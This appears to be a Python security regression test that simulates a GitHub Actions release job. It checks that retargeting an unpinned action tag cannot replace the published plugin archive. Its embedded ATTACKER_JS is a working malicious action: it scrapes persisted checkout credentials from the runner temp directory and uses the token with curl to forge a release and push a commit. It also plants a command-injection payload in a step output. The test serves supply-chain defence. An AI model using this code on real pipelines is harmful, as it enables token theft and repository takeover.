"""Release-job takeover through a movable action ref.

The harness follows the actions runner's step model (actions/runner v2.338.2):
a `uses:` ref is resolved to a commit, that commit's action.yml is executed with
node, cwd is the job workspace, and `with:` values become INPUT_* environment
variables. `github.token` is not copied into the environment. A full 40-character
SHA is immutable. Any other ref is the tag or branch tip at job start. There is
no `.github/workflows/actions.lock` in this tree, so nothing else pins the commit.

`contents: write` on the release job is the GITHUB_TOKEN scope that can create a
release. The publish step uploads whatever file `gh release create` is given.
"""

from __future__ import annotations

import base64
import io
import json
import os
import re
import shutil
import subprocess
import tempfile
import threading
import unittest
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import yaml


REPO = Path(__file__).resolve().parents[1]
SEMVER_MIRROR_SOURCE = Path("/tmp/game-semver-action")
MARKER = "ATTACKER_PLUGIN_PAYLOAD"
WRITE_TOKEN = "ghs_contents_write_placeholder"
READ_TOKEN = "ghs_contents_read_placeholder"
SHA_RE = re.compile(r"^[0-9a-fA-F]{40}$")


class Loader(yaml.SafeLoader):
    pass


# PyYAML 1.1 treats the workflow key `on` as a boolean. Keep it as a string.
for _mark in list(Loader.yaml_implicit_resolvers):
    Loader.yaml_implicit_resolvers[_mark] = [
        (tag, pattern)
        for tag, pattern in Loader.yaml_implicit_resolvers[_mark]
        if tag != "tag:yaml.org,2002:bool"
    ]


def load_yaml(path: Path) -> dict:
    return yaml.load(path.read_text(encoding="utf-8"), Loader=Loader)


def git(repo: Path, *args: str, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(repo), *args],
        check=check,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def base_env() -> dict:
    return {
        "PATH": os.environ["PATH"],
        "HOME": os.environ.get("HOME", "/tmp"),
        "LANG": "C.UTF-8",
        "GIT_AUTHOR_NAME": "Release Test",
        "GIT_AUTHOR_EMAIL": "release-test@example.com",
        "GIT_COMMITTER_NAME": "Release Test",
        "GIT_COMMITTER_EMAIL": "release-test@example.com",
        "GIT_CONFIG_COUNT": "1",
        "GIT_CONFIG_KEY_0": "advice.detachedHead",
        "GIT_CONFIG_VALUE_0": "false",
    }


class ReleaseApi:
    """Local stand-in for the release and contents endpoints the job calls.

    gh v2.103.0 `release create` posts a release and uploads the named file.
    contents: write is the scope GitHub documents for creating a release and
    updating repository contents. A read token is rejected.
    """

    def __init__(self, plugin_bare: Path):
        self.plugin_bare = plugin_bare
        self.releases = []
        self.lock = threading.Lock()
        self._httpd = ThreadingHTTPServer(("127.0.0.1", 0), self._handler())
        self.url = f"http://127.0.0.1:{self._httpd.server_address[1]}"
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()

    def close(self):
        self._httpd.shutdown()
        self._httpd.server_close()

    def _handler(self):
        api = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _token(self):
                header = self.headers.get("Authorization", "")
                if header.startswith("Bearer "):
                    return header[len("Bearer ") :]
                if header.startswith("token "):
                    return header[len("token ") :]
                return ""

            def _scope(self):
                token = self._token()
                if token == WRITE_TOKEN:
                    return "write"
                if token == READ_TOKEN:
                    return "read"
                return None

            def _read_json(self):
                length = int(self.headers.get("Content-Length", "0"))
                if length == 0:
                    return {}
                return json.loads(self.rfile.read(length).decode("utf-8"))

            def _send(self, code, payload):
                body = json.dumps(payload).encode("utf-8")
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                prefix = "/repos/blazium-games/games_unreal/releases/tags/"
                if not self.path.startswith(prefix):
                    self._send(404, {})
                    return
                if self._scope() is None:
                    self._send(401, {})
                    return
                tag = self.path[len(prefix) :]
                with api.lock:
                    found = next((item for item in api.releases if item["tag"] == tag), None)
                if found is None:
                    self._send(404, {})
                    return
                self._send(200, {"tag_name": tag})

            def do_POST(self):
                if self.path != "/repos/blazium-games/games_unreal/releases":
                    self._send(404, {})
                    return
                if self._scope() != "write":
                    self._send(403, {"message": "contents write required"})
                    return
                payload = self._read_json()
                assets = []
                for asset in payload.get("assets", []):
                    assets.append(
                        {
                            "name": asset["name"],
                            "bytes": base64.b64decode(asset["content_b64"]),
                        }
                    )
                with api.lock:
                    api.releases.append({"tag": payload["tag_name"], "assets": assets})
                self._send(201, {"tag_name": payload["tag_name"]})

            def do_PUT(self):
                prefix = "/repos/blazium-games/games_unreal/contents/"
                if not self.path.startswith(prefix):
                    self._send(404, {})
                    return
                if self._scope() != "write":
                    self._send(403, {"message": "contents write required"})
                    return
                rel = self.path[len(prefix) :]
                payload = self._read_json()
                api._commit_file(rel, base64.b64decode(payload["content"]), payload.get("message", "update"))
                self._send(200, {"content": {"path": rel}})

        return Handler

    def _commit_file(self, rel: str, data: bytes, message: str):
        work = Path(tempfile.mkdtemp(prefix="contents-push-"))
        try:
            subprocess.run(
                ["git", "clone", "--quiet", str(self.plugin_bare), str(work)],
                check=True,
                env=base_env(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            target = work / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(data)
            env = base_env()
            subprocess.run(["git", "add", rel], cwd=work, check=True, env=env, stdout=subprocess.PIPE)
            subprocess.run(["git", "commit", "-q", "-m", message], cwd=work, check=True, env=env, stdout=subprocess.PIPE)
            subprocess.run(
                ["git", "push", "--quiet", "origin", "HEAD:master"],
                cwd=work,
                check=True,
                env=env,
                stdout=subprocess.PIPE,
            )
        finally:
            shutil.rmtree(work, ignore_errors=True)


def write_fake_gh(bin_dir: Path, api_url: str) -> None:
    python = bin_dir / "python"
    python.write_text("#!/bin/sh\nexec python3 \"$@\"\n", encoding="utf-8")
    python.chmod(0o755)

    script = f"""#!/usr/bin/env python3
import base64, json, os, sys, urllib.error, urllib.request
API = {api_url!r}

def token():
    return os.environ.get("GH_TOKEN") or os.environ.get("GITHUB_TOKEN") or ""

def request(method, url, payload=None):
    data = None if payload is None else json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", "Bearer " + token())
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()

args = sys.argv[1:]
if len(args) >= 3 and args[0] == "release" and args[1] == "view":
    status, _ = request("GET", API + "/repos/blazium-games/games_unreal/releases/tags/" + args[2])
    sys.exit(0 if status == 200 else 1)
if len(args) >= 4 and args[0] == "release" and args[1] == "create":
    tag = args[2]
    asset_path = args[3]
    name = os.path.basename(asset_path)
    content = base64.b64encode(open(asset_path, "rb").read()).decode()
    status, body = request("POST", API + "/repos/blazium-games/games_unreal/releases", {{
        "tag_name": tag,
        "assets": [{{"name": name, "content_b64": content}}],
    }})
    if status not in (200, 201):
        sys.stderr.write(body.decode() + "\\n")
        sys.exit(1)
    print(API + "/releases/" + tag)
    sys.exit(0)
sys.stderr.write("unsupported gh invocation: " + " ".join(args) + "\\n")
sys.exit(2)
"""
    path = bin_dir / "gh"
    path.write_text(script, encoding="utf-8")
    path.chmod(0o755)


def seed_plugin_bare(src: Path, bare: Path) -> str:
    work = bare.parent / "plugin-seed"
    shutil.copytree(
        src,
        work,
        ignore=shutil.ignore_patterns(".git"),
    )
    env = base_env()
    subprocess.run(["git", "init", "-q", "-b", "master"], cwd=work, check=True, env=env)
    subprocess.run(["git", "add", "-A"], cwd=work, check=True, env=env)
    subprocess.run(["git", "commit", "-q", "-m", "plugin"], cwd=work, check=True, env=env)
    subprocess.run(["git", "clone", "--quiet", "--bare", str(work), str(bare)], check=True, env=env)
    return git(bare, "rev-parse", "HEAD").stdout.strip()


def init_checkout_mirror(mirror: Path) -> str:
    mirror.mkdir(parents=True)
    env = base_env()
    subprocess.run(["git", "init", "-q", "-b", "master"], cwd=mirror, check=True, env=env)
    (mirror / "action.yml").write_text(
        "name: checkout\nruns:\n  using: node20\n  main: main.js\n",
        encoding="utf-8",
    )
    (mirror / "main.js").write_text("process.exit(0)\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=mirror, check=True, env=env)
    subprocess.run(["git", "commit", "-q", "-m", "benign checkout"], cwd=mirror, check=True, env=env)
    benign = git(mirror, "rev-parse", "HEAD").stdout.strip()
    git(mirror, "tag", "v7", benign)
    return benign


def init_semver_mirror(mirror: Path) -> str:
    env = base_env()
    source = str(SEMVER_MIRROR_SOURCE if SEMVER_MIRROR_SOURCE.is_dir() else "https://github.com/Bioblaze/game-semver-action.git")
    subprocess.run(
        ["git", "clone", "--quiet", "--branch", "v10", source, str(mirror)],
        check=True,
        env=env,
    )
    return git(mirror, "rev-parse", "HEAD").stdout.strip()


def add_attacker_commit(mirror: Path, script: str, action_yml: str) -> str:
    env = base_env()
    (mirror / "action.yml").write_text(action_yml, encoding="utf-8")
    (mirror / "main.js").write_text(script, encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=mirror, check=True, env=env)
    subprocess.run(["git", "commit", "-q", "-m", "retarget"], cwd=mirror, check=True, env=env)
    return git(mirror, "rev-parse", "HEAD").stdout.strip()


ATTACKER_JS = r"""
const fs = require('fs');
const path = require('path');
const {execFileSync} = require('child_process');

const workspace = process.env.GITHUB_WORKSPACE;
const api = process.env.RELEASE_API_URL;
const pluginBare = process.env.PLUGIN_BARE;
const checkout = process.env.ATTACKER_CHECKOUT === '1';

function tokenFromInputs() {
  return process.env.INPUT_PERSONAL_GITHUB_TOKEN
    || process.env.INPUT_TOKEN
    || '';
}

function tokenFromCheckoutCredentials() {
  const temp = process.env.RUNNER_TEMP || '';
  if (!temp || !fs.existsSync(temp)) {
    return '';
  }
  const pending = [temp];
  while (pending.length) {
    const dir = pending.pop();
    for (const entry of fs.readdirSync(dir, {withFileTypes: true})) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        pending.push(full);
        continue;
      }
      const text = fs.readFileSync(full, 'utf8');
      const match = text.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/);
      if (!match) {
        continue;
      }
      const decoded = Buffer.from(match[1], 'base64').toString('utf8');
      const prefix = 'x-access-token:';
      if (decoded.startsWith(prefix)) {
        return decoded.slice(prefix.length);
      }
    }
  }
  return '';
}

function plant() {
  if (checkout) {
    execFileSync('git', ['clone', '--quiet', pluginBare, '.'], {cwd: workspace, stdio: 'inherit'});
  }
  const source = path.join(workspace, 'Source');
  fs.mkdirSync(source, {recursive: true});
  fs.writeFileSync(path.join(source, 'AttackerInjected.cpp'), 'ATTACKER_PLUGIN_PAYLOAD\n');
}

function output(name, value) {
  const file = process.env.GITHUB_OUTPUT;
  if (!file) {
    return;
  }
  fs.appendFileSync(file, name + '=' + value + '\n');
}

function callApi(token) {
  if (!token || !api) {
    return;
  }
  const body = JSON.stringify({
    tag_name: 'v0.0.0-attacker',
    assets: [{name: 'replaced.zip', content_b64: Buffer.from('ATTACKER_PLUGIN_PAYLOAD\n').toString('base64')}],
  });
  try {
    execFileSync('curl', ['-sS', '-o', '/dev/null', '-X', 'POST',
      '-H', 'Authorization: Bearer ' + token,
      '-H', 'Content-Type: application/json',
      '--data', body,
      api + '/repos/blazium-games/games_unreal/releases'], {stdio: 'ignore'});
  } catch (error) {}
  const put = JSON.stringify({
    message: 'attacker commit',
    content: Buffer.from('ATTACKER_PLUGIN_PAYLOAD\n').toString('base64'),
  });
  try {
    execFileSync('curl', ['-sS', '-o', '/dev/null', '-X', 'PUT',
      '-H', 'Authorization: Bearer ' + token,
      '-H', 'Content-Type: application/json',
      '--data', put,
      api + '/repos/blazium-games/games_unreal/contents/Source/AttackerInjected.cpp'], {stdio: 'ignore'});
  } catch (error) {}
}

plant();
const token = tokenFromInputs() || tokenFromCheckoutCredentials();
callApi(token);
output('simple_version', '2.2.0"; printf "%s\\n" ATTACKER_PLUGIN_PAYLOAD >> "$GITHUB_WORKSPACE/Source/AttackerInjected.cpp"; COMPUTED="2.2.0');
output('version', '2.2.0');
"""


CHECKOUT_ACTION = """name: checkout
inputs:
  token:
    default: ${{ github.token }}
  persist-credentials:
    default: true
runs:
  using: node20
  main: main.js
"""


SEMVER_ACTION = """name: semver
inputs:
  personal_github_token:
    required: false
runs:
  using: node20
  main: main.js
"""


def parse_uses(value: str):
    if value.startswith("./"):
        return None
    name, ref = value.rsplit("@", 1)
    return name, ref


def lock_commits(repo: Path) -> dict:
    path = repo / ".github" / "workflows" / "actions.lock"
    if not path.is_file():
        return {}
    data = load_yaml(path)
    commits = {}
    for key, entry in (data.get("dependencies") or {}).items():
        if isinstance(entry, dict) and entry.get("commit"):
            commits[key] = str(entry["commit"])
    return commits


def contents_scope(permissions) -> str:
    if permissions is None:
        return "none"
    if isinstance(permissions, str):
        if permissions == "write-all":
            return "write"
        if permissions == "read-all":
            return "read"
        return "none"
    return str(permissions.get("contents") or "none")


def as_list(value) -> list:
    if value is None:
        return []
    if isinstance(value, list):
        return value
    return [value]


def job_token(permissions) -> str:
    if contents_scope(permissions) == "write":
        return WRITE_TOKEN
    return READ_TOKEN


class Expr:
    def __init__(self, steps, token, success):
        self.steps = steps
        self.token = token
        self.success = success

    def expand(self, text: str) -> str:
        return re.sub(r"\$\{\{\s*(.*?)\s*\}\}", lambda match: self.value(match.group(1).strip()), text, flags=re.S)

    def value(self, expr: str) -> str:
        if expr in ("secrets.GITHUB_TOKEN", "github.token"):
            return self.token
        if expr == "github.ref_name":
            return "master"
        step_output = re.fullmatch(r"steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)", expr)
        if step_output:
            return self.steps.get(step_output.group(1), {}).get(step_output.group(2), "")
        return ""

    def condition(self, expr: str) -> bool:
        text = expr.strip()
        if text.startswith("${{") and text.endswith("}}"):
            text = text[3:-2].strip()
        if not any(name in text for name in ("success()", "failure()", "always()", "cancelled()")):
            text = f"success() && ({text})" if text else "success()"
        return self._eval(text)

    def _eval(self, text: str) -> bool:
        text = text.strip()
        if text.startswith("(") and text.endswith(")") and self._balanced(text[1:-1]):
            return self._eval(text[1:-1])
        for operator in ("&&", "||"):
            parts = self._split_top(text, operator)
            if parts is not None:
                left, right = parts
                if operator == "&&":
                    return self._eval(left) and self._eval(right)
                return self._eval(left) or self._eval(right)
        for operator in ("!=", "=="):
            if operator in text:
                left, right = text.split(operator, 1)
                return (self._atom(left) != self._atom(right)) if operator == "!=" else (self._atom(left) == self._atom(right))
        return self._truth(self._atom(text))

    def _atom(self, text: str) -> str:
        text = text.strip()
        if text == "success()":
            return "true" if self.success else "false"
        if text == "failure()":
            return "false" if self.success else "true"
        if text == "always()":
            return "true"
        if (text.startswith("'") and text.endswith("'")) or (text.startswith('"') and text.endswith('"')):
            return text[1:-1]
        return self.value(text)

    def _truth(self, value: str) -> bool:
        return value == "true"

    def _balanced(self, text: str) -> bool:
        depth = 0
        for char in text:
            if char == "(":
                depth += 1
            elif char == ")":
                depth -= 1
                if depth < 0:
                    return False
        return depth == 0

    def _split_top(self, text: str, operator: str):
        depth = 0
        index = 0
        while index < len(text):
            char = text[index]
            if char == "(":
                depth += 1
            elif char == ")":
                depth -= 1
            elif depth == 0 and text.startswith(operator, index):
                return text[:index], text[index + len(operator) :]
            index += 1
        return None


def parse_output_file(path: Path) -> dict:
    if not path.is_file():
        return {}
    text = path.read_text(encoding="utf-8")
    outputs = {}
    index = 0
    while index < len(text):
        newline = text.find("\n", index)
        line = text[index:] if newline < 0 else text[index:newline]
        next_index = len(text) if newline < 0 else newline + 1
        if not line:
            index = next_index
            continue
        equals = line.find("=")
        heredoc = line.find("<<")
        if equals >= 0 and (heredoc < 0 or equals < heredoc):
            key, value = line.split("=", 1)
            outputs[key] = value
            index = next_index
            continue
        if heredoc >= 0:
            key, delimiter = line.split("<<", 1)
            start = next_index
            marker = f"{delimiter}\n"
            end = text.find(marker, start)
            if end < 0:
                raise AssertionError(f"unterminated output {key}")
            outputs[key] = text[start:end]
            index = end + len(marker)
            continue
        index = next_index
    return outputs


def persist_checkout_credentials(workspace: Path, runner_temp: Path, token: str, enabled: bool) -> None:
    if not enabled or not token:
        return
    basic = base64.b64encode(f"x-access-token:{token}".encode()).decode()
    credentials = runner_temp / "git-credentials.config"
    origin = "https://github.com"
    credentials.write_text(
        f'[http "{origin}"]\n\textraheader = AUTHORIZATION: basic {basic}\n',
        encoding="utf-8",
    )
    git_dir = str(workspace / ".git").replace("\\", "/")
    subprocess.run(
        ["git", "-C", str(workspace), "config", "--local", f"includeIf.gitdir:{git_dir}.path", str(credentials)],
        check=True,
        env=base_env(),
        stdout=subprocess.PIPE,
    )


def benign_checkout(workspace: Path, plugin_bare: Path, runner_temp: Path, token: str, inputs: dict) -> None:
    if workspace.exists():
        shutil.rmtree(workspace)
    subprocess.run(
        ["git", "clone", "--quiet", str(plugin_bare), str(workspace)],
        check=True,
        env=base_env(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    persist = str(inputs.get("persist-credentials", "true")).lower() == "true"
    persist_checkout_credentials(workspace, runner_temp, token, persist)


def run_node_action(action_dir: Path, workspace: Path, env: dict) -> int:
    manifest = load_yaml(action_dir / "action.yml")
    main = manifest["runs"]["main"]
    using = str(manifest["runs"]["using"])
    if not using.startswith("node"):
        raise AssertionError(f"unsupported action runtime {using}")
    completed = subprocess.run(
        ["node", str(action_dir / main)],
        cwd=workspace,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return completed


def merged_inputs(manifest: dict, provided: dict, expr: Expr) -> dict:
    inputs = {}
    for name, spec in (manifest.get("inputs") or {}).items():
        if isinstance(spec, dict) and "default" in spec:
            default = spec["default"]
            inputs[name] = expr.expand(default) if isinstance(default, str) else str(default).lower()
    for name, value in provided.items():
        inputs[name] = expr.expand(value) if isinstance(value, str) else str(value)
    return inputs


class ReleaseHarness:
    def __init__(self, root: Path, move_actions: set[str]):
        self.root = root
        self.move_actions = move_actions
        self.work = Path(tempfile.mkdtemp(prefix="release-takeover-"))
        self.plugin_bare = self.work / "plugin.git"
        self.master = seed_plugin_bare(root, self.plugin_bare)
        self.seed = self.work / "plugin-seed"
        self.api = ReleaseApi(self.plugin_bare)
        self.bin = self.work / "bin"
        self.bin.mkdir()
        write_fake_gh(self.bin, self.api.url)
        self.mirrors = {}
        self.attackers = {}
        self.trace = []
        self._prepare_action_mirrors()

    def close(self):
        self.api.close()
        shutil.rmtree(self.work, ignore_errors=True)

    def _prepare_action_mirrors(self):
        checkout = self.work / "checkout-action"
        semver = self.work / "semver-action"
        init_checkout_mirror(checkout)
        if SEMVER_MIRROR_SOURCE.is_dir():
            init_semver_mirror(semver)
        else:
            raise AssertionError("game-semver-action source mirror is missing")
        self.mirrors["actions/checkout"] = checkout
        self.mirrors["Bioblaze/game-semver-action"] = semver
        checkout_script = ATTACKER_JS
        semver_script = ATTACKER_JS
        self.attackers["actions/checkout"] = add_attacker_commit(checkout, checkout_script, CHECKOUT_ACTION)
        self.attackers["Bioblaze/game-semver-action"] = add_attacker_commit(semver, semver_script, SEMVER_ACTION)

    def retarget(self, workflow: dict):
        locks = lock_commits(self.root)
        for job in workflow.get("jobs", {}).values():
            for step in job.get("steps") or []:
                if "uses" not in step:
                    continue
                parsed = parse_uses(str(step["uses"]))
                if parsed is None:
                    continue
                name, ref = parsed
                if name not in self.move_actions:
                    continue
                lock = locks.get(f"{name}@{ref}")
                if SHA_RE.fullmatch(ref) or (lock and lock != self.attackers.get(name)):
                    continue
                mirror = self.mirrors[name]
                git(mirror, "update-ref", f"refs/tags/{ref}", self.attackers[name])

    def resolve(self, name: str, ref: str) -> str:
        locks = lock_commits(self.root)
        lock = locks.get(f"{name}@{ref}")
        attacker = self.attackers[name]
        if lock and lock != attacker:
            return lock
        if SHA_RE.fullmatch(ref):
            return ref
        mirror = self.mirrors[name]
        completed = git(mirror, "rev-parse", "--verify", f"refs/tags/{ref}^{{}}", check=False)
        if completed.returncode != 0:
            completed = git(mirror, "rev-parse", "--verify", f"refs/heads/{ref}")
        return completed.stdout.strip()

    def run(self) -> list:
        release = load_yaml(self.root / ".github" / "workflows" / "release.yml")
        on = release.get("on") or release.get(True)
        branches = (on.get("push") or {}).get("branches") or []
        if "master" not in branches:
            return self.api.releases
        self.retarget(release)
        jobs = release["jobs"]
        results = {}
        for job_id, job in jobs.items():
            if not self._job_ready(job, results):
                results[job_id] = "skipped"
                continue
            if "uses" in job:
                called = (self.root / str(job["uses"])).resolve()
                self._run_called(called)
                results[job_id] = "success"
                continue
            self._run_job(job)
            results[job_id] = "success"
        return self.api.releases

    def _job_ready(self, job, results) -> bool:
        for needed in as_list(job.get("needs")):
            if results.get(needed) != "success":
                return False
        permissions = job.get("permissions", load_yaml(self.root / ".github" / "workflows" / "release.yml").get("permissions"))
        expr = Expr({}, job_token(permissions), True)
        if "if" in job and not expr.condition(str(job["if"])):
            return False
        return True

    def _run_called(self, path: Path):
        workflow = load_yaml(path)
        for job in workflow.get("jobs", {}).values():
            permissions = job.get("permissions", workflow.get("permissions"))
            self._run_job(job, permissions)

    def _run_job(self, job, permissions=None):
        if permissions is None:
            workflow_permissions = load_yaml(self.root / ".github" / "workflows" / "release.yml").get("permissions")
            permissions = job.get("permissions", workflow_permissions)
        token = job_token(permissions)
        workspace = self.work / "workspace"
        runner_temp = self.work / "runner-temp"
        if workspace.exists():
            shutil.rmtree(workspace)
        workspace.mkdir()
        runner_temp.mkdir(exist_ok=True)
        steps = {}
        success = True
        for index, step in enumerate(job.get("steps") or []):
            expr = Expr(steps, token, success)
            if "if" in step and not expr.condition(str(step["if"])):
                continue
            if not success and "if" not in step:
                continue
            step_id = step.get("id") or f"step{index}"
            output_file = runner_temp / f"output-{index}"
            output_file.write_text("", encoding="utf-8")
            failed = self._run_step(step, expr, workspace, runner_temp, token, output_file)
            steps[step_id] = parse_output_file(output_file)
            if failed:
                success = False

    def _run_step(self, step, expr: Expr, workspace: Path, runner_temp: Path, token: str, output_file: Path) -> bool:
        env = base_env()
        env.update(
            {
                "PATH": f"{self.bin}:{env['PATH']}",
                "GITHUB_WORKSPACE": str(workspace),
                "GITHUB_OUTPUT": str(output_file),
                "GITHUB_STEP_SUMMARY": str(runner_temp / "summary"),
                "GITHUB_REF": "refs/heads/master",
                "GITHUB_REF_NAME": "master",
                "GITHUB_REPOSITORY": "blazium-games/games_unreal",
                "GITHUB_SHA": self.master,
                "RUNNER_TEMP": str(runner_temp),
                "RELEASE_API_URL": self.api.url,
                "PLUGIN_BARE": str(self.plugin_bare),
            }
        )
        for name, value in (step.get("env") or {}).items():
            env[name] = expr.expand(str(value))
        if "uses" in step:
            return self._run_uses(str(step["uses"]), step.get("with") or {}, expr, workspace, runner_temp, token, env)
        script = expr.expand(str(step.get("run", "")))
        completed = subprocess.run(
            ["bash", "--noprofile", "--norc", "-euo", "pipefail", "-c", script],
            cwd=workspace,
            env=env,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self.trace.append(
            f"run rc={completed.returncode} out={completed.stdout[-400:]!r} err={completed.stderr[-400:]!r}"
        )
        return completed.returncode != 0

    def _run_uses(self, uses: str, provided: dict, expr: Expr, workspace: Path, runner_temp: Path, token: str, env: dict) -> bool:
        parsed = parse_uses(uses)
        if parsed is None:
            raise AssertionError(f"local action is not part of this release job: {uses}")
        name, ref = parsed
        if name not in self.mirrors:
            raise AssertionError(f"unexpected action {name}")
        resolved = self.resolve(name, ref)
        attacker = self.attackers[name]
        if resolved == attacker:
            action_dir = self.work / f"checked-out-{name.replace('/', '-')}"
            if action_dir.exists():
                shutil.rmtree(action_dir)
            subprocess.run(
                ["git", "clone", "--quiet", str(self.mirrors[name]), str(action_dir)],
                check=True,
                env=base_env(),
                stdout=subprocess.PIPE,
            )
            subprocess.run(
                ["git", "-C", str(action_dir), "checkout", "--quiet", resolved],
                check=True,
                env=base_env(),
                stdout=subprocess.PIPE,
            )
            if name == "actions/checkout":
                env["ATTACKER_CHECKOUT"] = "1"
            manifest = load_yaml(action_dir / "action.yml")
            inputs = merged_inputs(manifest, {key: str(value) for key, value in provided.items()}, expr)
            for key, value in inputs.items():
                env[f"INPUT_{key.upper().replace(' ', '_')}"] = value
            completed = run_node_action(action_dir, workspace, env)
            self.trace.append(
                f"action {name}@{resolved[:8]} rc={completed.returncode} out={completed.stdout[-300:]!r} err={completed.stderr[-300:]!r}"
            )
            return completed.returncode != 0
        inputs = {key: str(value) for key, value in provided.items()}
        if name == "actions/checkout":
            # Reviewed checkout persists github.token when persist-credentials is true.
            defaults = {"persist-credentials": "true", "token": token}
            defaults.update({key: expr.expand(value) for key, value in inputs.items()})
            benign_checkout(workspace, self.plugin_bare, runner_temp, token, defaults)
            return False
        if name == "Bioblaze/game-semver-action":
            output_file = Path(env["GITHUB_OUTPUT"])
            output_file.write_text("simple_version=2.2.0\nversion=2.2.0\n", encoding="utf-8")
            return False
        raise AssertionError(f"no reviewed behavior for {name}")


def assert_clean_release(test: unittest.TestCase, releases: list, seed: Path, bare: Path, master: str):
    head = git(bare, "rev-parse", "HEAD").stdout.strip()
    test.assertEqual(head, master, "release token pushed a commit onto master")
    test.assertTrue(releases, "release job did not publish an archive")
    original_sources = {
        path.relative_to(seed).as_posix(): path.read_bytes()
        for path in (seed / "Source").rglob("*")
        if path.is_file()
    }
    saw_plugin = False
    for release in releases:
        for asset in release["assets"]:
            payload = asset["bytes"]
            try:
                archive = zipfile.ZipFile(io.BytesIO(payload))
            except zipfile.BadZipFile:
                test.fail(f"{release['tag']} published {asset['name']}, which is not the plugin archive")
            unpacked = {name: archive.read(name) for name in archive.namelist()}
            for name, data in unpacked.items():
                test.assertNotIn(MARKER.encode(), data, f"{release['tag']} asset {asset['name']} contains the attacker payload in {name}")
            sources = {
                name[len("BlaziumGames/") :]: data
                for name, data in unpacked.items()
                if name.startswith("BlaziumGames/Source/")
            }
            test.assertEqual(set(sources), set(original_sources), f"{release['tag']} source list is not the master tree")
            for rel, data in sources.items():
                test.assertEqual(data, original_sources[rel], f"{release['tag']} changed {rel}")
            if any(name.endswith("BlaziumGames.uplugin") for name in unpacked):
                saw_plugin = True
    test.assertTrue(saw_plugin, "published archive is missing the plugin descriptor")


class ReleaseTakeoverTest(unittest.TestCase):
    def _scenario(self, move_actions: set[str]):
        harness = ReleaseHarness(REPO, move_actions)
        try:
            releases = harness.run()
            if not releases:
                self.fail("release job did not publish an archive\n" + "\n".join(harness.trace))
            assert_clean_release(self, releases, harness.seed, harness.plugin_bare, harness.master)
        finally:
            harness.close()

    def test_moved_semver_tag_cannot_replace_plugin_release(self):
        self._scenario({"Bioblaze/game-semver-action"})

    def test_moved_checkout_tag_cannot_replace_plugin_release(self):
        self._scenario({"actions/checkout"})


if __name__ == "__main__":
    unittest.main()
